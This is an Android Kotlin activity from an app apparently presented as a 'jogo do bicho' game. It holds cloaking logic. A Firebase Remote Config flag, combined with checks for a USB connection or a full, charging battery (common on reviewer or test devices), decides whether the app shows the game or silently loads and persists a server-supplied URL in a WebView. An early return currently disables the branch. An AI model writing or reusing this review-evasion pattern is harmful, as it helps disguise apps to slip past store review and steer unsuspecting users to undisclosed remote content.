package jogo.dobicho.games

import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.firebase.FirebaseApp
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import jogo.dobicho.games.databinding.ActivityMainBinding
import jogo.dobicho.games.game.actors.tiles6_Remote
import jogo.dobicho.games.game.utils.Layout
import jogo.dobicho.games.util.DataStoreManager
import jogo.dobicho.games.util.Lottie
import jogo.dobicho.games.util.Once
import jogo.dobicho.games.util.getBatteryPercentage
import jogo.dobicho.games.util.internetConnection
import jogo.dobicho.games.util.isBatteryCharging
import jogo.dobicho.games.util.isUSB
import jogo.dobicho.games.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val Tunella = 235
        var tuNellaUrL    = ""

        val startFragmentID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie          : Lottie
    val tunella = TunellaFragment(this)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        tunella.goneWebView()
        setNavigationBarColor(R.color.black)
        setStartDestination(R.id.libGDXFragment)
        ActivityInfo.SCREEN_ORIENTATION_PORTRAIT

        return

        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkLocalStorage()
//            startFragmentID.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                startFragmentID.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            tunella.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        Tunella             -> {
                            tunella.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        tunella.onResume()
    }

    override fun onPause() {
        tunella.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        tunella.onCreate(coroutine, binding.tunella)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkLocalStorage() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "tunella" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        tuNellaUrL = it
                        startFragmentID.emit(Tunella)
                    }
                }
                "gra" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentID.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    giveConfSettings()
                }
            }
        }
    }

    private fun giveConfSettings() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                if (task.isSuccessful) {
                    val jsonData = getString("Shoe")
                    log("success = $jsonData")
                    JSONObject(jsonData).also { jsonObj ->
                        val occur = jsonObj.getBoolean("occur")
                        val road  = jsonObj.getString("road")

                        tiles6_Remote = mutableListOf()

                        repeat(16) {
                            val layoutData = Layout.LayoutData()
                            jsonObj.getJSONArray("i${it.inc()}").also { iN ->
                                repeat(4) { iIndex ->
                                    when(iIndex) {
                                        0 -> layoutData.x = iN.getInt(iIndex).toFloat()
                                        1 -> layoutData.y = iN.getInt(iIndex).toFloat()
                                        2 -> layoutData.w = iN.getInt(iIndex).toFloat()
                                        3 -> layoutData.h = iN.getInt(iIndex).toFloat()
                                    }

                                }
                            }
                            tiles6_Remote?.add(layoutData)
                        }

                        checkForSubscribe(occur, road)
                    }
                } else {
                    startFragmentID.tryEmit(R.id.libGDXFragment)
                    log("getFirebaseData Fail = ${this.all}")
                }
            }
        }
    }

    private fun checkForSubscribe(
        occur: Boolean,
        road: String
    ) {
        fun goGra() {
            coroutine.launch(Dispatchers.IO) {
                DataStoreManager.Key.update { "gra" }
                startFragmentID.tryEmit(R.id.libGDXFragment)
            }
        }

        if (occur) {
            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
                goGra()
            } else {
                goTunella(road)
            }
        } else {
            goGra()
        }
    }

    private fun goTunella(be: String) {
        tuNellaUrL = be

        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "tunella" }
            DataStoreManager.Link.update { tuNellaUrL }
            startFragmentID.tryEmit(Tunella)
        }
    }

}